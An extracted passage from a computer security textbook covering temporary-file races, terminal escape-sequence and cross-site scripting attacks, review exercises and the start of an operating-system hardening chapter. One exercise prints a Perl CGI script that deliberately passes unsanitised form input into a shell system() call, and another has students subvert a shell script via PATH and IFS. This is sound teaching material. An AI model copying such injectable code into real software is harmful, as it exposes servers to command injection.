handler to append information provided \\r\\nby a user to this file. Subsequently another program, also using this locking mecha\\ufffenism, could access the file and process and remove these details. Note that there \\r\\nare subtle complexities related to locking files using different types of read or write \\r\\naccess. Suitable program or function references should be consulted on the correct \\r\\nuse of these features.\\r\\nSafe Temporary File Use\\r\\nMany programs need to store a temporary copy of data while they are processing the \\r\\ndata. A temporary file is commonly used for this purpose. Most operating systems \\r\\nprovide well-known locations for placing temporary files and standard functions for \\r\\nnaming and creating them. The critical issue with temporary files is that they are \\r\\nunique and not accessed by other processes. In a sense, this is the opposite problem \\r\\nFigure 11.8 Perl File Locking Example\\r\\n#!/usr/bin/perl\\r\\n#\\r\\n$EXCL_LOCK = 2;\\r\\n$UNLOCK = 8;\\r\\n$FILENAME = \"forminfo.dat\";\\r\\n# open data file and acquire exclusive access lock\\r\\nopen (FILE, \">> $FILENAME\") | | die \"Failed to open $FILENAME \\\\n\";\\r\\nflock FILE, $EXCL_LOCK;\\r\\n… use exclusive access to the forminfo file to save details\\r\\n# unlock and close file\\r\\nflock FILE, $UNLOCK;\\r\\nclose(FILE);\\r\\nM11_STAL0611_04_GE_C11.indd 410 10/11/17 3:02 PM\\n\\n\\nto managing access to a shared file. The most common technique for constructing a \\r\\ntemporary filename is to include a value such as the process identifier. As each pro\\ufffecess has its own distinct identifier, this should guarantee a unique name. The program \\r\\ngenerally checks to ensure that the file does not already exist, perhaps left over from \\r\\na crash of a previous program, then creates the file. This approach suffices from the \\r\\nperspective of reliability but not with respect to security.\\r\\nAgain the problem is that an attacker does not play by the rules. The attacker \\r\\ncould attempt to guess the temporary filename a privileged program will use. The \\r\\nattacker then attempts to create a file with that name in the interval between the \\r\\nprogram checking the file does not exist and subsequently creating it. This is another \\r\\nexample of a race condition, very similar to that when two processes race to access \\r\\na shared file when locks are not used. There is a famous example, reported in \\r\\n[WHEE03], of some versions of the tripwire file integrity program9\\r\\n suffering from \\r\\nthis bug. The attacker would write a script that made repeated guesses on the tem\\ufffeporary filename used and create a symbolic link from that name to the password file. \\r\\nAccess to the password file was restricted, so the attacker could not write to it. \\r\\nHowever, the tripwire program runs with root privileges, giving it access to all files \\r\\non the system. If the attacker succeeds, then tripwire will follow the link and use the \\r\\npassword file as its temporary file, destroying all user login details and denying \\r\\naccess to the system until the administrators can replace the password file with a \\r\\nbackup copy. This was a very effective and inconvenient denial-of-service attack on \\r\\nthe targeted system. This illustrates the importance of securely managing temporary \\r\\nfile creation.\\r\\nSecure temporary file creation and use preferably requires the use of a random \\r\\ntemporary filename. The creation of this file should be done using an atomic system \\r\\nprimitive, as is done with the creation of a lockfile. This prevents the race condition \\r\\nand hence the potential exploit of this file. The standard C function mkstemp() is \\r\\nsuitable; however, the older functions tmpfile(), tmpnam(), and tempnam() are all \\r\\ninsecure unless used with care. It is also important that the minimum access is given \\r\\nto this file. In most cases only the effective owner of the program creating this file \\r\\nshould have any access. The GNOME Programming Guidelines recommend using \\r\\nthe C code shown in Figure 11.9 to create a temporary file in a shared directory on \\r\\nLinux and UNIX systems. Although this code calls the insecure tempnam() function, \\r\\nit uses a loop with appropriately restrictive file creation flags to counter its security \\r\\ndeficiencies. Once the program has finished using the file, it must be closed and \\r\\nunlinked. Perl programmers can use the File::Temp module for secure temporary file \\r\\ncreation. Programmers using other languages should consult appropriate references \\r\\nfor suitable methods.\\r\\nWhen the file is created in a shared temporary directory, the access permissions \\r\\nshould specify that only the owner of the temporary file, or the system administrators, \\r\\nshould be able to remove it. This is not always the default permission setting, which \\r\\n9\\r\\nTripwire is used to scan all directories and files on a system, detecting any important files that have unau\\ufffethorized changes. Tripwire can be used to detect attempts to subvert the system by an attacker. It can also \\r\\ndetect incorrect program behavior that is causing unexpected changes to files.\\r\\n11.4 / INTERACTING WITH THE OPERATING SYSTEM 411\\r\\nM11_STAL0611_04_GE_C11.indd 411 10/11/17 3:02 PM\\n\\n\\n412 CHAPTER 11 / SOFTWARE SECURITY\\r\\nchar *filename;\\r\\nint fd;\\r\\ndo {\\r\\n filename = tempnam (NULL, \"foo\");\\r\\n fd = open (filename, O CREAT | O EXCL | O TRUNC | O RDWR, 0600);\\r\\n free (filename);\\r\\n} while (fd == –1);\\r\\nFigure 11.9 C Temporary File Creation Example\\r\\nmust be corrected to enable secure use of such files. On Linux and UNIX systems this \\r\\nrequires setting the sticky permission bit on the temporary directory, as we discussed \\r\\nin Sections 4.4 and 25.3.\\r\\nInteracting with Other Programs\\r\\nAs well as using functionality provided by the operating system and standard library \\r\\nfunctions, programs may also use functionality and services provided by other programs. \\r\\nUnless care is taken with this interaction, failure to identify assumptions about the \\r\\nsize and interpretation of data flowing among different programs can result in security \\r\\nvulnerabilities. We discussed a number of issues related to managing program input in \\r\\nSection 11.2 and program output in Section 11.5. The flow of information between pro\\ufffegrams can be viewed as output from one forming input to the other. Such issues are of \\r\\nparticular concern when the program being used was not originally written with this \\r\\nwider use as a design issue and hence did not adequately identify all the security con\\ufffecerns that might arise. This occurs particularly with the current trend of providing Web \\r\\ninterfaces to programs that users previously ran directly on the server system. While \\r\\nideally all programs should be designed to manage security concerns and be written \\r\\ndefensively, this is not the case in reality. Hence the burden falls on the newer pro\\ufffegrams, utilizing these older programs, to identify and manage any security issues that \\r\\nmay arise.\\r\\nA further concern relates to protecting the confidentiality and integrity of the \\r\\ndata flowing among various programs. When these programs are running on the same \\r\\ncomputer system, appropriate use of system functionality such as pipes or tempo\\uffferary files provides this protection. If the programs run on different systems, linked \\r\\nby a suitable network connection, then appropriate security mechanisms should be \\r\\nemployed by these network connections. Alternatives include the use of IP Security \\r\\n(IPSec), Transport Layer/Secure Socket Layer Security (TLS/SSL), or Secure Shell \\r\\n(SSH) connections. Even when using well regarded, standardized protocols, care is \\r\\nneeded to ensure they use strong cryptography, as weaknesses have been found in a \\r\\nnumber of algorithms and their implementations [SIMP11]. We will discuss some of \\r\\nthese alternatives in Chapter 22.\\r\\nSuitable detection and handling of exceptions and errors generated by program \\r\\ninteraction is also important from a security perspective. When one process invokes \\r\\nanother program as a child process, it should ensure that the program terminates cor\\uffferectly and accept its exit status. It must also catch and process signals resulting from \\r\\ninteraction with other programs and the operating system.\\r\\nM11_STAL0611_04_GE_C11.indd 412 10/11/17 3:02 PM\\n\\n\\n11.5 / HANDLING PROGRAM OUTPUT 413\\r\\n11.5 HANDLING PROGRAM OUTPUT\\r\\nThe final component of our model of computer programs is the generation of output \\r\\nas a result of the processing of input and other interactions. This output might be \\r\\nstored for future use (e.g., in files or a database), or be transmitted over a network \\r\\nconnection, or be destined for display to some user. As with program input, the out\\ufffeput data may be classified as binary or textual. Binary data may encode complex \\r\\nstructures, such as requests to an X-Windows display system to create and manipu\\ufffelate complex graphical interface display components. Or the data could be complex \\r\\nbinary network protocol structures. If representing textual information, the data will \\r\\nbe encoded using some character set and possibly representing some structured out\\ufffeput, such as HTML.\\r\\nIn all cases, it is important from a program security perspective that the output \\r\\nreally does conform to the expected form and interpretation. If directed to a user, \\r\\nit will be interpreted and displayed by some appropriate program or device. If this \\r\\noutput includes unexpected content, then anomalous behavior may result, with det\\uffferimental effects on the user. A critical issue here is the assumption of common origin. \\r\\nIf a user is interacting with a program, the assumption is that all output seen was cre\\ufffeated by, or at least validated by, that program. However, as the discussion of cross-site \\r\\nscripting (XSS) attacks in Section 11.2 illustrates, this assumption may not be valid. \\r\\nA program may accept input from one user, save it, and subsequently display it to \\r\\nanother user. If this input contains content that alters the behavior of the program \\r\\nor device displaying the data, and the content is not adequately sanitized by the pro\\ufffegram, then an attack on the user is possible.\\r\\nConsider two examples. The first involves simple text-based programs run on \\r\\nclassic time-sharing systems when purely textual terminals, such as the VT100, were \\r\\nused to interact with the system.10 Such terminals often supported a set of function \\r\\nkeys, which could be programmed to send any desired sequence of characters when \\r\\npressed. This programming was implemented by sending a special escape sequence.11\\r\\nThe terminal would recognize these sequences and, rather than displaying the char\\ufffeacters on the screen, would perform the requested action. In addition to programming \\r\\nthe function keys, other escape sequences were used to control formatting of the \\r\\ntextual output (bold, underline, etc.), to change the current cursor location, and criti\\ufffecally to specify that the current contents of a function key should be sent, as if the user \\r\\nhad just pressed the key. Together, these capabilities could be used to implement a \\r\\nclassic command injection attack on a user, which was a favorite student prank in \\r\\nprevious years. The attacker would get the victim to display some carefully crafted text \\r\\non his or her terminal. This could be achieved by convincing the victim to run a \\r\\nprogram, have it included in an e-mail message, or have it written directly to the vic\\ufffetim’s terminal if the victim permitted this. While displaying some innocent message to \\r\\ndistract the targeted user, this text would also include a number of escape sequences \\r\\n11So designated because such sequences almost always started with the escape (ESC) character from the \\r\\nASCII character set.\\r\\n10Common terminal programs typically emulate such a device when interacting with a command-line shell \\r\\non a local or remote system.\\r\\nM11_STAL0611_04_GE_C11.indd 413 10/11/17 3:02 PM\\n\\n\\n414 CHAPTER 11 / SOFTWARE SECURITY\\r\\nthat first programmed a function key to send some selected command and then the \\r\\ncommand to send that text as if the programmed function key had been pressed. If \\r\\nthe text was displayed by a program that subsequently exited, then the text sent from \\r\\nthe programmed function key would be treated as if the targeted user had typed it as \\r\\nhis or her next command. Hence the attacker could make the system perform any \\r\\ndesired operation the user was permitted to do. This could include deleting the user’s \\r\\nfiles or changing the user’s password. With this simple form of attack, the user would \\r\\nsee the commands and the response being displayed and know it had occurred, though \\r\\ntoo late to prevent it. With more subtle combinations of escape sequences, it was pos\\ufffesible to capture and prevent this text from being displayed, hiding the fact of the attack \\r\\nfrom direct observation by the user until its consequences became obvious. A more \\r\\nmodern variant of this attack exploits the capabilities of an insufficiently protected \\r\\nX-terminal display to similarly hijack and control one or more of the user’s sessions.\\r\\nThe key lesson illustrated by this example concerns the user’s expectations of \\r\\nthe type of output that would be sent to the user’s terminal display. The user expected \\r\\nthe output to be primarily pure text for display. If a program such as a text editor or \\r\\nmail client used formatted text or the programmable function keys, then it was trusted \\r\\nnot to abuse these capabilities. And indeed, most such programs encountered by users \\r\\ndid indeed respect these conventions. Programs like a mail client, which displayed \\r\\ndata originating from other users, needed to filter such text to ensure that any escape \\r\\nsequences included in them were disabled. The issue for users then was to identify \\r\\nother programs that could not be so trusted, and if necessary filter their output to \\r\\nfoil any such attack. Another lesson seen here, and even more so in the subsequent \\r\\nX-terminal variant of this attack, was to ensure that untrusted sources were not per\\ufffemitted to direct output to a user’s display. In the case of traditional terminals, this \\r\\nmeant disabling the ability of other users to write messages directly to the user’s dis\\ufffeplay. In the case of X-terminals, it meant configuring the authentication mechanisms so \\r\\nonly programs run at the user’s command were permitted to access the user’s display.\\r\\nThe second example is the classic cross-site scripting (XSS) attack using a guest\\ufffebook on some Web server. If the guestbook application fails adequately to check \\r\\nand sanitize any input supplied by one user, then this can be used to implement \\r\\nan attack on users subsequently viewing these comments. This attack exploits the \\r\\nassumptions and security models used by Web browsers when viewing content from \\r\\na site. Browsers assume all of the content was generated by that site and is equally \\r\\ntrusted. This allows programmable content like JavaScript to access and manipulate \\r\\ndata and metadata at the browser site, such as cookies associated with that site. The \\r\\nissue here is that not all data were generated by, or under the control of, that site. \\r\\nRather, the data came from some other, untrusted user.\\r\\nAny programs that gather and rely on third-party data have to be responsible \\r\\nfor ensuring that any subsequent use of such data is safe and does not violate the \\r\\nuser’s assumptions. These programs must identify what is permissible output content \\r\\nand filter any possibly untrusted data to ensure that only valid output is displayed. \\r\\nThe simplest filtering alternative is to remove all HTML markup. This will certainly \\r\\nmake the output safe but can conflict with the desire to allow some formatting of the \\r\\noutput. The alternative is to allow just some safe markup through. As with input fil\\ufffetering, the focus should be on allowing only what is safe rather than trying to remove \\r\\nwhat is dangerous, as the interpretation of dangerous may well change over time.\\r\\nM11_STAL0611_04_GE_C11.indd 414 10/11/17 3:02 PM\\n\\n\\n11.6 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS 415\\r\\nAnother issue here is that different character sets allow different encodings of \\r\\nmeta characters, which may change the interpretation of what is valid output. If the \\r\\ndisplay program or device is unaware of the specific encoding used, it might make \\r\\na different assumption to the program, possibly subverting the filtering. Hence it is \\r\\nimportant for the program either to explicitly specify encoding where possible or \\r\\notherwise ensure that the encoding conforms to the display expectations. This is the \\r\\nobverse of the issue of input canonicalization, where the program ensures that it \\r\\nhad a common minimal representation of the input to validate. In the case of Web \\r\\noutput, it is possible for a Web server to specify explicitly the character set used in \\r\\nthe Content-Type HTTP response header. Unfortunately, this is not specified as often \\r\\nas it should be. If not specified, browsers will make an assumption about the default \\r\\ncharacter set to use. This assumption is not clearly codified; hence different browsers \\r\\ncan and do make different choices. If Web output is being filtered, the character set \\r\\nshould be specified.\\r\\nNote that in these examples of security flaws that result from program output, \\r\\nthe target of compromise was not the program generating the output but rather the \\r\\nprogram or device used to display the output. It could be argued that this is not \\r\\nthe concern of the programmer, as their program is not subverted. However, if the \\r\\nprogram acts as a conduit for attack, the programmer’s reputation will be tarnished, \\r\\nand users may well be less willing to use the program. In the case of XSS attacks, a \\r\\nnumber of well-known sites were implicated in these attacks and suffered adverse \\r\\npublicity.\\r\\n11.6 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\r\\nKey Terms\\r\\natomic operation\\r\\ncanonicalization\\r\\ncode injection\\r\\ncommand injection\\r\\ncross-site scripting (XSS) \\r\\nattack\\r\\ndefensive programming\\r\\nenvironment variable\\r\\nfuzzing\\r\\ninjection attack\\r\\nleast privilege\\r\\nmemory leak\\r\\nprivilege escalation\\r\\nrace condition\\r\\nregular expression\\r\\nsecure programming\\r\\nsoftware quality\\r\\nsoftware reliability\\r\\nsoftware security\\r\\nSQL injection\\r\\nXSS reflection\\r\\nReview Questions\\r\\n11.1 Define the difference between software quality and reliability and software security.\\r\\n11.2 Define defensive programming.\\r\\n11.3 When does a buffer overflow occur?\\r\\n11.4 Define an injection attack. List some examples of injection attacks. What are the \\r\\ngeneral circumstances in which injection attacks are found?\\r\\n11.5 State the similarities and differences between command injection and SQL injection \\r\\nattacks.\\r\\n11.6 Define a code injection attack. List an example of such an attack.\\r\\nM11_STAL0611_04_GE_C11.indd 415 10/11/17 3:02 PM\\n\\n\\n416 CHAPTER 11 / SOFTWARE SECURITY\\r\\n11.7 State the main technique used by a defensive programmer to validate assumptions \\r\\nabout program input.\\r\\n11.8 Explain canonicaliztion and its purpose.\\r\\n11.9 Define cross-site scripting (XSS) reflection vulnerability.\\r\\n11.10 What is the significance of canonicalization?\\r\\n11.11 Define race condition. State how it can occur when multiple processes access shared \\r\\nmemory.\\r\\n11.12 What are environment variables? Explain with a few examples.\\r\\n11.13 Describe the advantages and the disadvantages of fuzzing.\\r\\n11.14 What is memory leak and what are its implications?\\r\\n11.15 Identify several issues associated with the correct creation and use of a temporary file \\r\\nin a shared directory.\\r\\n11.16 List some problems that may result from a program sending unvalidated input from \\r\\none user to another user.\\r\\nProblems\\r\\n11.1 Describe the possible ways of defending the attack shown in Figure 11.4.\\r\\n11.2 Identify a list of the most popular SQL metacharacters or reserved words which are \\r\\nused by the majority of the relational databases in the present scenario and inves\\ufffetigate their meaning. What does this imply about input validation checks used to \\r\\nprevent SQL injection attacks across different types of relational databases in use \\r\\ntoday?\\r\\n11.3 Rewrite the perl finger CGI script shown in Figure 11.2 to include both appropriate \\r\\ninput validation and more informative error messages, as suggested by footnote 3 in \\r\\nSection 11.2. Extend the input validation to also permit any of the characters −+% \\r\\nin the middle of $user value, but not at either the start or end of this value. Con\\ufffesider the implications of further permitting space or tab characters within this value. \\r\\nBecause such values separate arguments to a shell command, the $user value must \\r\\nbe surrounded by the correct quote characters when passed to the finger command. \\r\\nDetermine how this is done. If possible, copy your modified script, and the form \\r\\nused to call it, to a suitable Linux/UNIX-hosted Web server, and verify its correct \\r\\noperation.\\r\\n11.4 You are asked to improve the security in the CGI handler script used to send \\r\\ncomments to the Web master of your server. The current script in use is shown in \\r\\nFigure 11.10a, with the associated form shown in Figure 11.10b. Identify some security \\r\\ndeficiencies present in this script. Detail what steps are needed to correct them, and \\r\\ndesign an improved version of this script.\\r\\n11.5 Investigate the issues that arise while using sequence number as both identifier and \\r\\nauthenticator of packets. Identify the root cause of the problem.\\r\\n11.6 Investigate the various types of cross-site scripting (XSS) attacks. How can such \\r\\nattacks be prevented? \\r\\n11.7 One approach to improving program safety is to use a fuzzing tool. These test programs \\r\\nusing a large set of automatically generated inputs, as we discussed in Section 11.2. \\r\\nIdentity some suitable fuzzing tools for a system that you know. Determine the cost, \\r\\navailability, and ease of use of these tools. Indicate the types of development projects \\r\\nthey would be suitable to use in.\\r\\nM11_STAL0611_04_GE_C11.indd 416 10/11/17 3:02 PM\\n\\n\\n11.6 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS 417\\r\\n11.8 Another approach to improving program safety is to use a static analysis tool, which \\r\\nscans the program source looking for known program deficiencies. Identity some suit\\ufffeable static analysis tools for a language that you know. Determine the cost, availability, \\r\\nand ease of use of these tools. Indicate the types of development projects they would \\r\\nbe suitable to use in.\\r\\n#!/usr/bin/perl\\r\\n# comment.cgi - send comment to webmaster\\r\\n# specify recipient of comment email\\r\\n$to = \"webmaster\";\\r\\nuse CGI;\\r\\nuse CGI::Carp qw(fatalsToBrowser);\\r\\n$q = new CGI; # create query object\\r\\n# display HTML header\\r\\nprint $q->header,\\r\\n$q->start_html(\\'Comment Sent\\'),\\r\\n$q->h1(\\'Comment Sent\\');\\r\\n# retrieve form field values and send comment to webmaster\\r\\n$subject = $q->param(\"subject\");\\r\\n$from = $q->param(\"from\");\\r\\n$body = $q->param(\"body\");\\r\\n# generate and send comment email\\r\\nsystem(\"export REPLYTO=\\\\\"$from\\\\\"; echo \\\\\"$body\\\\\" | mail -s \\\\\"$subject\\\\\"\\r\\n$to\");\\r\\n# indicate to user that email was sent\\r\\nprint ”Thank you for your comment on $subject.\";\\r\\nprint \"This has been sent to $to.\";\\r\\n# display HTML footer\\r\\nprint $q->end_html;\\r\\nFigure 11.10 Comment Form Handler Exercise\\r\\n(a) Comment CGI script\\r\\n(b) Web comment form\\r\\n<html><head><title>Send a Comment</title></head><body>\\r\\n<h1> Send a Comment </h1>\\r\\n<form method=post action=\"comment.cgi\">\\r\\n<b>Subject of this comment</b>: <input type=text name=subject value=\"\">\\r\\n<b>Your Email Address</b>: <input type=text name=from value=\"\">\\r\\n<p>Please enter comments here:\\r\\n<p><textarea name=\"body\" rows=15 cols=50></textarea>\\r\\n<p><input type=submit value=\"Send Comment\">\\r\\n<input type=\"reset\" value=\"Clear Form\">\\r\\n</form></body></html>\\r\\nM11_STAL0611_04_GE_C11.indd 417 10/11/17 3:02 PM\\n\\n\\n418 CHAPTER 11 / SOFTWARE SECURITY\\r\\n11.9 Examine the current values of all environment variables on a system you use. If pos\\ufffesible, determine the use for some of these values. Determine how to change the values \\r\\nboth temporarily for a single process and its children, and permanently for all subse\\ufffequent logins on the system.\\r\\n11.10 Experiment on a Linux/UNIX system with a version of the vulnerable shell script \\r\\nshown in Figures 11.6a and 11.6b, but using a small data file of your own. Explore \\r\\nchanging first the PATH environment variable, then the IFS variable as well, and mak\\ufffeing this script execute another program of your choice.\\r\\nM11_STAL0611_04_GE_C11.indd 418 10/11/17 3:02 PM\\n\\n\\n419\\r\\n12.1 Introduction to Operating System Security\\r\\n12.2 System Security Planning\\r\\n12.3 Operating Systems Hardening\\r\\nOperating System Installation: Initial Setup and Patching\\r\\nRemove Unnecessary Services, Application, and Protocols\\r\\nConfigure Users, Groups, and Authentication\\r\\nConfigure Resource Controls\\r\\nInstall Additional Security Controls\\r\\nTest the System Security\\r\\n12.4 Application Security\\r\\nApplication Configuration\\r\\nEncryption Technology\\r\\n12.5 Security Maintenance\\r\\nLogging\\r\\nData Backup and Archive\\r\\n12.6 Linux/Unix Security\\r\\nPatch Management\\r\\nApplication and Service Configuration\\r\\nUsers, Groups, and Permissions\\r\\nRemote Access Controls\\r\\nLogging and Log Rotation\\r\\nApplication Security Using a chroot jail\\r\\nSecurity Testing\\r\\n12.7 Windows Security\\r\\nPatch Management\\r\\nUsers Administration and Access Controls\\r\\nApplication and Service Configuration\\r\\nOther Security Controls\\r\\nSecurity Testing\\r\\n12.8 Virtualization Security\\r\\nVirtualization Alternatives\\r\\nVirtualization Security Issues\\r\\nSecuring Virtualization Systems\\r\\n12.9 Key Terms, Review Questions, and Problems\\r\\nOperating System Security\\r\\nCHAPTER \\r\\nM12_STAL0611_04_GE_C12.indd 419 10/11/17 3:02 PM\\n\\n\\n420 CHAPTER 12 / OPERATING SYSTEM SECURITY\\r\\nComputer client and server systems are central components of the IT infrastructure \\r\\nfor most organizations. The client systems provide access to organizational data and \\r\\napplications, supported by the servers housing those data and applications. How\\ufffeever, given that most large software systems will almost certainly have a number of \\r\\nsecurity weaknesses, as we discussed in Chapter 6 and in the previous two chapters, \\r\\nit is currently necessary to manage the installation and continuing operation of these \\r\\nsystems to provide appropriate levels of security despite the expected presence of \\r\\nthese vulnerabilities. In some circumstances, we may be able to use trusted computing \\r\\nsystems designed and evaluated to provide security by design. We will examine some \\r\\nof these possibilities in Chapter 27.\\r\\nIn this chapter, we discuss how to provide systems security as a hardening pro\\ufffecess that includes planning, installation, configuration, update, and maintenance of \\r\\nthe operating system and the key applications in use, following the general approach \\r\\ndetailed in NIST SP 800-123 (Guide to General Server Security, July 2008). We con\\ufffesider this process for the operating system, and then key applications in general, then \\r\\ndiscuss some specific aspects in relation to Linux and Windows systems in particular. \\r\\nWe conclude with a discussion on securing virtualized systems, where multiple virtual \\r\\nmachines may execute on the one physical system.\\r\\nWe view a system as having a number of layers, with the physical hardware at \\r\\nthe bottom; the base operating system above including privileged kernel code, APIs, \\r\\nand services; and finally user applications and utilities in the top layer, as shown in \\r\\nFigure 12.1. This figure also shows the presence of BIOS and possibly other code that \\r\\nLEARNING OBJECTIVES\\r\\nAfter studying this chapter, you should be able to:\\r\\n◆ List the steps needed in the process of securing a system.\\r\\n◆ Detail the need for planning system security.\\r\\n◆ List the basic steps used to secure the base operating system.\\r\\n◆ List the additional steps needed to secure key applications.\\r\\n◆ List steps needed to maintain security.\\r\\n◆ List some specific aspects of securing Unix/Linux systems.\\r\\n◆ List some specific aspects of securing Windows systems.\\r\\n◆ List steps needed to maintain security in virtualized systems.\\r\\nFigure 12.1 Operating System Security Layers\\r\\nPhysical Hardware\\r\\nOperating System Kernel\\r\\nUser Applications and Utilities\\r\\nBIOS / SMM\\r\\nM12_STAL0611_04_GE_C12.indd 420 10/11/17 3:02 PM\\n\\n\\n12.1 / INTRODUCTION TO OPERATING SYSTEM SECURITY 421\\r\\nis external to, and largely not visible from, the operating system kernel, but is used \\r\\nwhen booting the system or to support low-level hardware control. Each of these \\r\\nlayers of code needs appropriate hardening measures in place to provide appropriate \\r\\nsecurity services. And each layer is vulnerable to attack from below, should the lower \\r\\nlayers not also be secured appropriately.\\r\\nA number of reports note the use of a small number of basic hardening mea\\ufffesures can prevent a large proportion of the attacks seen in recent years. Since 2010, \\r\\nthe Australian Signals Directorate (ASD) list of the “Top 35 Mitigation Strategies”\\r\\nnotes that implementing just the top four of these strategies would have prevented \\r\\nat least 85% of the targeted cyber intrusions investigated by ASD. Hence, since 2013 \\r\\nthese top four strategies are mandatory for all Australian government agencies. These \\r\\ntop four strategies are as follows:\\r\\n1. White-list approved applications.\\r\\n2. Patch third-party applications.\\r\\n3. Patch operating system vulnerabilities and use the latest versions.\\r\\n4. Restrict administrative privileges.\\r\\nCollectively these assist in creating a defence-in-depth system. We discuss all four of \\r\\nthese strategies, and many others in the ASD list, in this chapter. Note these strategies \\r\\nlargely align with those in the “20 Critical Controls” developed by DHS, NSA, the \\r\\nDepartment of Energy, SANS, and others in the United States.\\r\\n12.1 INTRODUCTION TO OPERATING SYSTEM SECURITY\\r\\nAs we noted above, computer client and server systems are central components of \\r\\nthe IT infrastructure for most organizations, may hold critical data and applications, \\r\\nand are a necessary tool for the function of an organization. Accordingly, we need to \\r\\nbe aware of the expected presence of vulnerabilities in operating systems and appli\\ufffecations as distributed, and the existence of worms scanning for such vulnerabilities \\r\\nat high rates, such as those we discussed in Section 6.3. Thus, it is quite possible for \\r\\na system to be compromised during the installation process, before it can install the \\r\\nlatest patches or implement other hardening measures. Hence, building and deploy\\ufffeing a system should be a planned process designed to counter such a threat, and to \\r\\nmaintain security during its operational lifetime.\\r\\nNIST SP 800-123 states that this process must:\\r\\n• Assess risks and plan the system deployment.\\r\\n• Secure the underlying operating system and then the key applications.\\r\\n• Ensure any critical content is secured.\\r\\n• Ensure appropriate network protection mechanisms are used.\\r\\n• Ensure appropriate processes are used to maintain security.\\r\\nWhile we addressed the selection of network protection mechanisms in Chapter 9, \\r\\nwe will examine the other items in the rest of this chapter.\\r\\nM12_STAL0611_04_GE_C12.indd 421 10/11/17 3:02 PM\\n\\n\\n422 CHAPTER 12 / OPERATING SYSTEM SECURITY\\r\\n12.2 SYSTEM SECURITY PLANNING\\r\\nThe first step in deploying new systems is planning. Careful planning will help to \\r\\nensure that the new system is as secure as possible, and complies with any necessary \\r\\npolicies. This planning should be informed by a wider security assessment of the orga\\ufffenization, since every organization has distinct security requirements and concerns. \\r\\nWe will discuss this wider planning process in Chapters 14 and 15.\\r\\nThe aim of the specific system installation planning process is to maximize \\r\\nsecurity while minimizing costs. Wide experience shows that it is much more difficult \\r\\nand expensive to “retro-fit” security at a later time, than it is to plan and provide it \\r\\nduring the initial deployment process. This planning process needs to determine the \\r\\nsecurity requirements for the system, its applications and data, and of its users. This \\r\\nthen guides the selection of appropriate software for the operating system and appli\\ufffecations, and provides guidance on appropriate user configuration and access control \\r\\nsettings. It also guides the selection of other hardening measures required. The plan \\r\\nalso needs to identify appropriate personnel to install and manage the system, noting \\r\\nthe skills required and any training needed.\\r\\nNIST SP 800-123 provides a list of items that should be considered during the \\r\\nsystem security planning process. While its focus is on secure server deployment, much \\r\\nof the list applies equally well to client system design. This list includes consideration of:\\r\\n• The purpose of the system, the type of information stored, the applications and \\r\\nservices provided, and their security requirements.\\r\\n• The categories of users of the system, the privileges they have, and the types of \\r\\ninformation they can access.\\r\\n• How the users are authenticated.\\r\\n• How access to the information stored on the system is managed.\\r\\n• What access the system has to information stored on other hosts, such as file or \\r\\ndatabase servers, and how this is managed.\\r\\n• Who will administer the system, and how they will manage the system (via local \\r\\nor remote access).\\r\\n• Any additional security measures required on the system, including the use of \\r\\nhost firewalls, anti-virus or other malware protection mechanisms, and logging.\\r\\n12.3 OPERATING SYSTEMS HARDENING\\r\\nThe first critical step in securing a system is to secure the base operating system \\r\\nupon which all other applications and services rely. A good security foundation needs \\r\\na properly installed, patched, and configured operating system. Unfortunately, the \\r\\ndefault configuration for many operating systems often maximizes ease of use and \\r\\nfunctionality, rather than security. Further, since every organization has its own secu\\uffferity needs, the appropriate security profile, and hence configuration, will also differ. \\r\\nWhat is required for a particular system should be identified during the planning \\r\\nphase, as we have just discussed.\\r\\nM12_STAL0611_04_GE_C12.indd 422 10/11/17 3:02 PM\\n\\n\\n12.3 / OPERATING SYSTEMS HARDENING 423\\r\\nWhile the details of how to secure each specific operating system differ, the \\r\\nbroad approach is similar. Appropriate security configuration guides and checklists \\r\\nexist for most common operating systems, and these should be consulted, though \\r\\nalways informed by the specific needs of each organization and their systems. In \\r\\nsome cases, automated tools may be available to further assist in securing the system \\r\\nconfiguration.\\r\\nNIST SP 800-123 suggests the following basic steps that should be used to \\r\\nsecure an operating system:\\r\\n• Install and patch the operating system.\\r\\n• Harden and configure the operating system to adequately address the identified \\r\\nsecurity needs of the system by:\\r\\n• Removing unnecessary services, applications, and protocols.\\r\\n• Configuring users, groups, and permissions.\\r\\n• Configuring resource controls.\\r\\n• Install and configure additional security controls, such as anti-virus, host-based \\r\\nfirewalls, and intrusion detection systems (IDS), if needed.\\r\\n• Test the security of the basic operating system to ensure that the steps taken \\r\\nadequately address its security needs.\\r\\nOperating System Installation: Initial Setup and Patching\\r\\nSystem security begins with the installation of the operating system. As we have \\r\\nalready noted, a network connected, unpatched system, is vulnerable to exploit during \\r\\nits installation or continued use. Hence, it is important that the system not be exposed \\r\\nwhile in this vulnerable state. Ideally, new systems should be constructed on a pro\\ufffetected network. This may be a completely isolated network, with the operating system \\r\\nimage and all available patches transferred to it using removable media such as DVDs \\r\\nor USB drives. Given the existence of malware that can propagate using removable \\r\\nmedia, as we discussed in Chapter 6, care is needed to ensure the media used here is \\r\\nnot so infected. Alternatively, a network with severely restricted access to the wider \\r\\nInternet may be used. Ideally, it should have no inbound access, and have outbound \\r\\naccess only to the key sites needed for the system installation and patching process. \\r\\nIn either case, the full installation and hardening process should occur before the \\r\\nsystem is deployed to its intended, more accessible, and hence vulnerable, location.\\r\\nThe initial installation should install the minimum necessary for the desired \\r\\nsystem, with additional software packages included only if they are required for the \\r\\nfunction of the system. We explore the rationale for minimizing the number of pack\\ufffeages on the system shortly.\\r\\nThe overall boot process must also be secured. This may require adjusting \\r\\noptions on, or specifying a password required for changes to, the BIOS code used \\r\\nwhen the system initially boots. It may also require limiting from which media the \\r\\nsystem is normally permitted to boot. This is necessary to prevent an attacker from \\r\\nchanging the boot process to install a covert hypervisor, such as we discussed in Sec\\ufffetion 6.8, or to just boot a system of their choice from external media in order to bypass \\r\\nthe normal system access controls on locally stored data. The use of a cryptographic \\r\\nfile system may also be used to address this threat, as we will note later.\\r\\nM12_STAL0611_04_GE_C12.indd 423 10/11/17 3:02 PM\\n\\n\\n424 CHAPTER 12 / OPERATING SYSTEM SECURITY\\r\\nCare is also required with the selection and installation of any additional device \\r\\ndriver code, since this executes with full kernel level privileges, but is often supplied \\r\\nby a third party. The integrity and source of such driver code must be carefully vali\\ufffedated given the high level of trust it has. A malicious driver can potentially bypass \\r\\nmany security controls to install malware. This was done in both the Blue Pill dem\\ufffeonstration rootkit, which we discussed in Section 6.8, and the Stuxnet 